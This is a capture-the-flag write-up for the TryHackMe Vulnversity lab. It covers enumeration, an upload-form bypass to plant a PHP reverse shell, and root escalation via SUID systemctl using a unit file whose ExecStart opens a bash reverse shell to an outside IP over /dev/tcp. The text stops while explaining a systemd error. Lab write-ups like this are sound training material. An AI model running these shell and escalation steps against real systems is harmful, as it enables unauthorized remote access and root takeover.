# [Vulnversity](https://tryhackme.com/r/room/vulnversity)

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/logo.png)

## Enumeration

### Nmap Scan
`nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.118.67`
```
# Nmap 7.93 scan initiated Thu Apr 11 21:27:32 2024 as: nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.19.43
Warning: 10.10.19.43 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.19.43
Host is up (0.35s latency).
Not shown: 64870 closed tcp ports (conn-refused), 659 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-04-11T11:45:53-04:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-11T15:45:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 11 22:16:05 2024 -- 1 IP address (1 host up) scanned in 2913.22 seconds
```
### Gobuster Directory Fuzzing

We will be using Seclist for directory fuzzing

`gobuster dir --url http://10.10.118.67:3333 -w /opt/SecLists/Discovery/Web-Content/common.txt`
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.67:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/04/11 23:38:50 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 317] [--> http://10.10.118.67:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.118.67:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.118.67:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 322] [--> http://10.10.118.67:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.118.67:3333/js/]
/server-status        (Status: 403) [Size: 302]
Progress: 4727 / 4727 (100.00%)
===============================================================
2024/04/11 23:43:01 Finished
===============================================================
```

### Browsing into `/internal` directory

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/internal_directory.png)

We have found a form to upload files.we can take advantage of this feature to upload and execute our payload.
Let's try uploading a php reverse shell and intercept the traffic.

We will be using `php-reverse-shell.php` by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
Before uploading the reverse shell make sure to change the `$ip` and `$port` variables.

### Modifying `php-reverse-shell.php`
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/php-chg-ip.png)

### Intercepting through Brup Suite
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/burp-intercept.png)

### Selecting `php` for Fuzzing file extensions with intruder
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/select.png)

### Setting wordlist for fuzzing
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/wordlist.png)

### Acknowledging the difference in length of the response from the server
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/length-diff.png)

### Looking through the response code and find the word `success`
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/success.png)

### Listen netcat at port `1337` for reverse shell
```
nc -lvnp 1337
```

### Execute the payload
Browse
```
http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml
```

### Gaining Access
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/gain-acc.png)

`cat /etc/passwd`
![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/passwd.png)

### Upgrading the shell

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/import_pty.png)

## Previledge Escalation

### Looking for Files with SUID Permission
`find / -type f -user root -perm -4000 2>/dev/null`
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
The above command can be modified for long listing the files
`find / -type f -user root -perm -4000 -exec ls -lash {} \; 2>/dev/null`
or
`find / -type f -user root -perm -4000 2>/dev/null | xargs -I{} ls -lash {}`
for faster output

`/bin/systemctl` should not be allowed to run as the owner `root`. We can take advantage of the permission to gain `root` access.



Let us create the file named `root.service` under `/tmp` directory
```
[Unit]
Description=root

[Service]
Type=simple
ExecStart=/bin/bash -c 'exec 5<>/dev/tcp/10.12.34.56/1337; bash >&5 2>&5 0<&5'

[Install]
WantedBy=multi-user.target
```

Since we are creating `systemd` unit files under the directory that is not one of the standard directories of `systemd`, we have to create a symbolic link under /etc/systemd/system/ directory to make our unit file(`root.service`) available for management by systemctl by either running
```
sudo systemctl link /tmp/root.service
```
or by manually running
```
sudo ln -s /tmp/rooting.service /etc/systemd/system/root.service
```
Then we reload our configuration files for systemd to recognize our changes.
```
sudo systemctl daemon-reload
```
We then `enable` and `start` our service.
```
sudo systemctl enable root.service
sudo systemctl start root.service
```

![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/mount-error.png)

Now, we have encountered `Failed to start tmp-root.service.mount: Unit tmp-root.service.mount not found` and cannot start our `root.service` resulting in not running our script.

This problem is because when we create a systemd unit file in the `/tmp` directory, systemd treats this file as a transient or temporary unit. Unit files in `/tmp` are typically considered temporary and are subject to specific behaviors and restrictions by systemd.

Even if your unit.service file does not directly declare dependencies on mount units, the service itself might indirectly rely on filesystems or resources that are typically managed by mount units. In this case our service interacts with the file `/bin/bash` that reside on specific filesystems. Systemd can automatically infer dependencies on mount units that manage these filesystems to ensure they are mounted before the service starts.

When we create a systemd service unit (let's say `unit.service`) that interacts with specific files or directories, systemd may implicitly infer dependencies on mount units (`.mount` files) that manage the filesystems where these files/directories reside.
Systemd attempts to ensure that all necessary resources (including filesystems) are available before starting services. If our service requires access to files on certain filesystems, systemd will try to resolve dependencies by referencing the corresponding mount units.



